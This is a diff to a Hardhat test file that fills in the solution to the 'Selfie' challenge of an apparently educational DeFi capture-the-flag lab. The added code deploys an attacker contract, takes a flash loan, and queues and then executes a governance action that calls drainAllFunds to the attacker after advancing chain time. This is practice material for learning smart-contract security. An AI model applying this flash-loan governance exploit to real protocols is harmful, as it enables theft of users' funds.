@@ -1,3 +1,5 @@
+//@ts-check
+/// <reference path="../../node_modules/@nomiclabs/hardhat-ethers/src/internal/type-extensions.ts" />
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
@@ -31,6 +33,21 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const SelfiePoolAttacker = await ethers.getContractFactory('SelfiePoolAttacker', attacker);
+        const selfiePoolAttacker = await SelfiePoolAttacker.deploy(this.pool.address);
+        
+        await this.token.connect(attacker).approve(selfiePoolAttacker.address, ethers.constants.MaxUint256);
+        selfiePoolAttacker.connect(attacker).flashLoan();
+        const tx = await this.governance.connect(attacker).queueAction(
+            this.pool.address,
+            this.pool.interface.encodeFunctionData('drainAllFunds', [attacker.address]),
+            0
+        );
+        const actionId = (await tx.wait()).events[0].args.actionId;
+        
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+
+        this.governance.connect(attacker).executeAction(actionId);
     });
 
     after(async function () {
